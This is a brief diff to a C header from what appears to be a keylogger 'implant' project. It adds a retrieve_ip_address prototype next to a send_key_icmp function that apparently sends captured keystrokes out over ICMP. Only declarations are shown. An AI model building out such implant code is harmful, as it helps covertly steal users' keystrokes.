@@ -66,6 +66,7 @@ typedef struct implant_s {
 #define KEY_RELEASED 0
 
 // net.c
+int retrieve_ip_address(char *ip[32]);
 int send_key_icmp(implant_t *, struct input_event);
 
 // opt.c
